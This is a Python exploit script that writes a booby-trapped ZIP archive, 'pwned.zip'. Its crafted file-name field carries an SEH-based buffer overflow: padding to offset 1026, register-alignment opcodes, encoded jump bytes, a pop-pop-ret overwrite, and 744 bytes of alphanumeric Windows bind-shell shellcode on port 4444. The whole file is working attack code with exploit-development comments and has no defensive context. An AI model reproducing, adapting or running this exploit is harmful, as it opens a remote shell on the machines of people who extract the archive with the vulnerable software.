#!/usr/bin/python

ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

#central directory header
cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00\x24\x00\x00"
"\x00\x00\x00\x00\x00")

# end of central directory header
eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")


# -------------------
# Exploit Development
# Notes:
#   89 -> EB - JMP SHORT
# JNB 0x97 = JNB 0xF9 = Same as EB 0xFB = Jump Up 5 bytes

# [*] Exact match at offset 1026
junk1 = "\x41" * 222

align  = ""
align += "\x58" # POP EAX

# ADD EAX 696
# 0012F585   05 40060101      ADD EAX,1010640
# 0012F58A   05 57010101      ADD EAX,1010157
# 0012F58F   2D 01010202      SUB EAX,2020101
align += "\x05\x40\x06\x01\x01" # ADD EAX,01 01 06 40
align += "\x05\x57\x01\x01\x01" # ADD EAX,01 01 01 57
align += "\x2D\x01\x01\x02\x02" # SUB EAX,02 02 01 01
align += "\x89\x1C"             # JMP 89->EB
align += "\x41" * 28            # padding

## windows/shell_bind_tcp lport=4444 exitfunc=seh
## alpha2 eax --uppercase   744 bytes
shellcode = ""
shellcode += "PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLZHMYEP5PS03PK"
shellcode += "9ZE6QN2CTLK0RVPLKPR4LLKQBTTLKSBVH4ONWQZVFFQKOFQO0NLGL3QSL4BVLQ0YQXO4MUQIWKRJPF2QGLKPRB0"
shellcode += "LKPBGLEQ8PLK70RXMUO0BTQZEQHPPPLK78TXLK687PS1XSM37LPILKWDLKUQ8V6QKO6QYPNL9Q8OTMEQ9WFXKPT"
shellcode += "5ZT33SMJX7KCM14CEZB1HLKPXWTUQN3SVLKTLPKLKV85LEQXSLK34LKS1HPK9W47TQ4QK1KSQQI0Z0QKOM0PXQO"
shellcode += "QJLKTRJKK61MSXVS02EP5PCXBW3CFRQOF4SXPLT77VDGKO9EX8LPS1UPS0WYO4F4PP3X7YMP2KS0KOHUV00P0P6"
shellcode += "0QPV01PPPRHJJTOIOKPKON5MYO7FQYK0SSXS2S0TQQLMYKVSZB0PVPW3XO2YK7GCWKO8UPSPWE8X7KYWHKOKOHU"
shellcode += "QCV3PWSX2TJLGKKQKON5V7MYHG58BU2N0M3QKON52HRCBM54UPMYKS0W67676QL62JTRPYPVKRKMSVO774WTWLU"
shellcode += "QUQLM0DGTB0O65PPD0TV0PV0V0VQVPVPNPV1FQC66SXT9XLWOLFKOYEK9M0PNV6QVKOFPCXUXK75MSPKON5OKKN"
shellcode += "TNP2ZJBHY6LUOMMMKON5WLUV3L5ZK0KKKPRUC5OKW74S2R2ORJ5PPSKO8UUZA"

junk2 = "\x42" * 5

# "\x82\x85\x81\x98\x98" will become -> "\xE9\xE0\xFC\xFF\xFF"
jump2 = "\x82\x85\x81\x98\x98"

# "\x4B\x56" become -> "\xEB\xF7" # JMP SHORT -5
jump1 = "\x89\xF6\x41\x41"

# 0x0040564b : pop ecx # pop ebp # ret 
seh = "\x4b\x56\x40\x00"

# 4068 - 1026 - 4
junk3 = "\x43" * 3038

exploit = junk1 + align + shellcode + junk2 + jump2 + jump1 + seh + junk3
# -------------------


print "[+] Writing payload to pwned.zip"
# write the payload
mefile = open('pwned.zip','w');
mefile.write(ldf_header + exploit + cdf_header + exploit + eofcdf_header);
mefile.close()
print "[+] Exploit file created!!"
